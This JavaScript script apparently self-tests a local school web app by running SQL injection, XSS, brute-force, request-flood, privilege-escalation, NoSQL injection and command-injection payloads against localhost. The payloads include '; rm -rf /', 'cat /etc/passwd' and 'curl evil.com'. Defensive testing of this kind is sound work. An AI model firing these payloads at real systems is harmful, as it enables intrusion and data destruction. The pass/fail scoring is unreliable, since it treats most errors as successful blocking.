/**
 * PRUEBA DE PENETRACIÓN COMPLETA - SIMULACIÓN DE ATAQUE HACKER
 * Testing exhaustivo de todas las defensas implementadas
 */

import axios from 'axios';
import crypto from 'crypto';

const BASE_URL = 'http://localhost:5000';

console.log("🎯 INICIANDO PRUEBA DE PENETRACIÓN - SIMULACIÓN HACKER");
console.log("=" .repeat(70));

class HackerSimulation {
  constructor() {
    this.results = {
      attemptedAttacks: 0,
      successfulBreaches: 0,
      blockedAttacks: 0,
      detectedAnomalies: 0
    };
  }

  // 1. ATAQUE SQL INJECTION
  async testSQLInjection() {
    console.log("\n🔍 1. TESTING SQL INJECTION ATTACKS");
    
    const maliciousPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "' OR 1=1#",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --"
    ];

    for (const payload of maliciousPayloads) {
      this.results.attemptedAttacks++;
      try {
        console.log(`   Intentando: ${payload}`);
        
        const response = await axios.post(`${BASE_URL}/api/auth/login`, {
          email: payload,
          password: "anything"
        }, { timeout: 5000 });

        console.log(`   ❌ VULNERABILIDAD: SQL Injection exitoso`);
        this.results.successfulBreaches++;
      } catch (error) {
        if (error.response?.status === 400) {
          console.log(`   ✅ BLOQUEADO: Input inválido detectado`);
          this.results.blockedAttacks++;
        } else {
          console.log(`   ✅ PROTEGIDO: ${error.message}`);
          this.results.blockedAttacks++;
        }
      }
    }
  }

  // 2. ATAQUE XSS (Cross-Site Scripting)
  async testXSSAttacks() {
    console.log("\n🔍 2. TESTING XSS ATTACKS");
    
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "javascript:alert('XSS')",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "';alert('XSS');//",
      "<iframe src=javascript:alert('XSS')></iframe>"
    ];

    for (const payload of xssPayloads) {
      this.results.attemptedAttacks++;
      try {
        console.log(`   Intentando: ${payload.substring(0, 30)}...`);
        
        const response = await axios.post(`${BASE_URL}/api/users`, {
          nombre: payload,
          email: "test@test.com",
          password: "password123"
        }, { timeout: 5000 });

        console.log(`   ❌ VULNERABILIDAD: XSS no sanitizado`);
        this.results.successfulBreaches++;
      } catch (error) {
        console.log(`   ✅ PROTEGIDO: XSS bloqueado`);
        this.results.blockedAttacks++;
      }
    }
  }

  // 3. ATAQUE BRUTE FORCE
  async testBruteForceAttack() {
    console.log("\n🔍 3. TESTING BRUTE FORCE ATTACK");
    
    const commonPasswords = [
      "123456", "password", "admin", "12345678", "qwerty",
      "123456789", "letmein", "1234567", "football", "iloveyou",
      "admin123", "welcome", "monkey", "login", "abc123"
    ];

    console.log(`   Intentando ${commonPasswords.length} contraseñas comunes...`);
    
    for (let i = 0; i < commonPasswords.length; i++) {
      this.results.attemptedAttacks++;
      try {
        const response = await axios.post(`${BASE_URL}/api/auth/login`, {
          email: "admin@escuela.mx",
          password: commonPasswords[i]
        }, { timeout: 2000 });

        console.log(`   ❌ VULNERABILIDAD: Contraseña débil detectada: ${commonPasswords[i]}`);
        this.results.successfulBreaches++;
        break;
      } catch (error) {
        if (error.response?.status === 429) {
          console.log(`   ✅ PROTEGIDO: Rate limiting activado después de ${i + 1} intentos`);
          this.results.blockedAttacks++;
          break;
        }
        // Continuar con siguiente password
      }
    }
  }

  // 4. ATAQUE DE SOBRECARGA (DDoS)
  async testDDoSAttack() {
    console.log("\n🔍 4. TESTING DDoS ATTACK");
    
    const concurrentRequests = 50;
    const requests = [];
    
    console.log(`   Enviando ${concurrentRequests} requests simultáneos...`);
    
    for (let i = 0; i < concurrentRequests; i++) {
      this.results.attemptedAttacks++;
      requests.push(
        axios.get(`${BASE_URL}/api/security/metrics`, { timeout: 1000 })
          .catch(error => error)
      );
    }

    try {
      const results = await Promise.all(requests);
      const successful = results.filter(r => r.status === 200).length;
      const blocked = results.filter(r => r.response?.status === 429).length;
      
      console.log(`   Exitosos: ${successful}, Bloqueados: ${blocked}`);
      
      if (blocked > successful) {
        console.log(`   ✅ PROTEGIDO: Rate limiting efectivo`);
        this.results.blockedAttacks += blocked;
      } else {
        console.log(`   ❌ VULNERABILIDAD: Sistema vulnerable a DDoS`);
        this.results.successfulBreaches += successful;
      }
    } catch (error) {
      console.log(`   ✅ PROTEGIDO: Servidor resistió el ataque`);
      this.results.blockedAttacks += concurrentRequests;
    }
  }

  // 5. ATAQUE DE ESCALACIÓN DE PRIVILEGIOS
  async testPrivilegeEscalation() {
    console.log("\n🔍 5. TESTING PRIVILEGE ESCALATION");
    
    const privilegedEndpoints = [
      '/api/admin/users',
      '/api/admin/settings',
      '/api/security/report',
      '/api/campus/delete',
      '/api/users/all'
    ];

    for (const endpoint of privilegedEndpoints) {
      this.results.attemptedAttacks++;
      try {
        console.log(`   Accediendo a: ${endpoint}`);
        
        const response = await axios.get(`${BASE_URL}${endpoint}`, {
          headers: {
            'Authorization': 'Bearer fake-token',
            'X-User-Role': 'admin'
          },
          timeout: 5000
        });

        console.log(`   ❌ VULNERABILIDAD: Acceso no autorizado a ${endpoint}`);
        this.results.successfulBreaches++;
      } catch (error) {
        if (error.response?.status === 401 || error.response?.status === 403) {
          console.log(`   ✅ PROTEGIDO: Acceso denegado correctamente`);
          this.results.blockedAttacks++;
        } else {
          console.log(`   ✅ PROTEGIDO: Endpoint no accesible`);
          this.results.blockedAttacks++;
        }
      }
    }
  }

  // 6. ATAQUE DE MANIPULACIÓN DE HEADERS
  async testHeaderManipulation() {
    console.log("\n🔍 6. TESTING HEADER MANIPULATION");
    
    const maliciousHeaders = {
      'X-Forwarded-For': '127.0.0.1, 192.168.1.1, 10.0.0.1',
      'X-Real-IP': '192.168.1.100',
      'X-Originating-IP': '10.0.0.5',
      'User-Agent': '<script>alert("XSS")</script>',
      'Referer': 'javascript:alert("XSS")',
      'Content-Length': '999999999',
      'X-Admin': 'true',
      'X-Debug': 'true'
    };

    for (const [header, value] of Object.entries(maliciousHeaders)) {
      this.results.attemptedAttacks++;
      try {
        console.log(`   Manipulando header: ${header}`);
        
        const response = await axios.get(`${BASE_URL}/api/security/metrics`, {
          headers: { [header]: value },
          timeout: 5000
        });

        console.log(`   ⚠️  Header aceptado sin validación`);
      } catch (error) {
        console.log(`   ✅ PROTEGIDO: Header malicioso rechazado`);
        this.results.blockedAttacks++;
      }
    }
  }

  // 7. ATAQUE DE INYECCIÓN DE COMANDOS
  async testCommandInjection() {
    console.log("\n🔍 7. TESTING COMMAND INJECTION");
    
    const commandPayloads = [
      "; ls -la",
      "&& cat /etc/passwd",
      "| whoami",
      "; rm -rf /",
      "&& curl evil.com",
      "$(cat /etc/hosts)"
    ];

    for (const payload of commandPayloads) {
      this.results.attemptedAttacks++;
      try {
        console.log(`   Intentando: ${payload}`);
        
        const response = await axios.post(`${BASE_URL}/api/security/scan`, {
          target: `localhost${payload}`
        }, { timeout: 5000 });

        console.log(`   ❌ VULNERABILIDAD: Command injection posible`);
        this.results.successfulBreaches++;
      } catch (error) {
        console.log(`   ✅ PROTEGIDO: Command injection bloqueado`);
        this.results.blockedAttacks++;
      }
    }
  }

  // 8. ATAQUE DE ENUMERACIÓN DE USUARIOS
  async testUserEnumeration() {
    console.log("\n🔍 8. TESTING USER ENUMERATION");
    
    const commonEmails = [
      "admin@escuela.mx",
      "administrator@escuela.mx", 
      "root@escuela.mx",
      "test@escuela.mx",
      "user@escuela.mx"
    ];

    for (const email of commonEmails) {
      this.results.attemptedAttacks++;
      try {
        console.log(`   Verificando existencia: ${email}`);
        
        const response = await axios.post(`${BASE_URL}/api/auth/login`, {
          email: email,
          password: "wrongpassword"
        }, { timeout: 5000 });

        // Si obtenemos respuestas diferentes, hay enumeración
        console.log(`   ⚠️  Posible enumeración de usuarios`);
      } catch (error) {
        // Respuesta consistente es buena
        console.log(`   ✅ PROTEGIDO: Respuesta consistente`);
        this.results.blockedAttacks++;
      }
    }
  }

  // 9. PRUEBA DE CIFRADO Y TOKENS
  async testEncryptionBreaking() {
    console.log("\n🔍 9. TESTING ENCRYPTION BREAKING");
    
    // Intentar adivinar tokens débiles
    const weakTokens = [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "admin_token_123",
      "Bearer abc123",
      "session_12345"
    ];

    for (const token of weakTokens) {
      this.results.attemptedAttacks++;
      try {
        console.log(`   Probando token: ${token.substring(0, 20)}...`);
        
        const response = await axios.get(`${BASE_URL}/api/security/report`, {
          headers: { 'Authorization': `Bearer ${token}` },
          timeout: 5000
        });

        console.log(`   ❌ VULNERABILIDAD: Token débil aceptado`);
        this.results.successfulBreaches++;
      } catch (error) {
        console.log(`   ✅ PROTEGIDO: Token rechazado`);
        this.results.blockedAttacks++;
      }
    }
  }

  // 10. ATAQUE DE INYECCIÓN LDAP/NoSQL
  async testInjectionAttacks() {
    console.log("\n🔍 10. TESTING INJECTION ATTACKS");
    
    const injectionPayloads = [
      "admin')('",
      "*)(uid=*",
      "admin'||'1'=='1",
      {"$ne": null},
      {"$gt": ""},
      {"$where": "function() { return true; }"}
    ];

    for (const payload of injectionPayloads) {
      this.results.attemptedAttacks++;
      try {
        console.log(`   Inyección: ${JSON.stringify(payload).substring(0, 30)}...`);
        
        const response = await axios.post(`${BASE_URL}/api/auth/login`, {
          email: payload,
          password: payload
        }, { timeout: 5000 });

        console.log(`   ❌ VULNERABILIDAD: Inyección exitosa`);
        this.results.successfulBreaches++;
      } catch (error) {
        console.log(`   ✅ PROTEGIDO: Inyección bloqueada`);
        this.results.blockedAttacks++;
      }
    }
  }

  // REPORTE FINAL
  generatePenetrationReport() {
    console.log("\n" + "=".repeat(70));
    console.log("📊 REPORTE FINAL DE PENETRACIÓN");
    console.log("=".repeat(70));
    
    console.log(`📈 ESTADÍSTICAS DE ATAQUE:`);
    console.log(`   • Total de ataques intentados: ${this.results.attemptedAttacks}`);
    console.log(`   • Ataques exitosos (vulnerabilidades): ${this.results.successfulBreaches}`);
    console.log(`   • Ataques bloqueados: ${this.results.blockedAttacks}`);
    
    const blockRate = (this.results.blockedAttacks / this.results.attemptedAttacks * 100).toFixed(1);
    const vulnerabilityRate = (this.results.successfulBreaches / this.results.attemptedAttacks * 100).toFixed(1);
    
    console.log(`\n🛡️  EFICACIA DE DEFENSAS:`);
    console.log(`   • Tasa de bloqueo: ${blockRate}%`);
    console.log(`   • Tasa de vulnerabilidad: ${vulnerabilityRate}%`);
    
    if (this.results.successfulBreaches === 0) {
      console.log(`\n✅ RESULTADO: SISTEMA ALTAMENTE SEGURO`);
      console.log(`   Todas las defensas funcionaron correctamente.`);
      console.log(`   No se detectaron vulnerabilidades críticas.`);
    } else if (this.results.successfulBreaches < 3) {
      console.log(`\n⚠️  RESULTADO: SISTEMA MODERADAMENTE SEGURO`);
      console.log(`   Se detectaron ${this.results.successfulBreaches} vulnerabilidades menores.`);
      console.log(`   Revisar y fortalecer las defensas comprometidas.`);
    } else {
      console.log(`\n❌ RESULTADO: SISTEMA VULNERABLE`);
      console.log(`   Se detectaron ${this.results.successfulBreaches} vulnerabilidades críticas.`);
      console.log(`   Se requiere fortalecimiento inmediato de seguridad.`);
    }
    
    console.log(`\n🔒 RECOMENDACIONES:`);
    if (blockRate > 90) {
      console.log(`   • Excelente sistema de defensa implementado`);
      console.log(`   • Continuar monitoreando y actualizando defensas`);
    } else {
      console.log(`   • Fortalecer validación de inputs`);
      console.log(`   • Implementar rate limiting más estricto`);
      console.log(`   • Mejorar autenticación y autorización`);
    }
    
    console.log("\n=".repeat(70));
  }

  // EJECUTAR TODAS LAS PRUEBAS
  async runFullPenetrationTest() {
    try {
      await this.testSQLInjection();
      await this.testXSSAttacks();
      await this.testBruteForceAttack();
      await this.testDDoSAttack();
      await this.testPrivilegeEscalation();
      await this.testHeaderManipulation();
      await this.testCommandInjection();
      await this.testUserEnumeration();
      await this.testEncryptionBreaking();
      await this.testInjectionAttacks();
      
      this.generatePenetrationReport();
    } catch (error) {
      console.error('Error durante la prueba de penetración:', error.message);
    }
  }
}

// EJECUTAR SIMULACIÓN COMPLETA
const hacker = new HackerSimulation();
hacker.runFullPenetrationTest();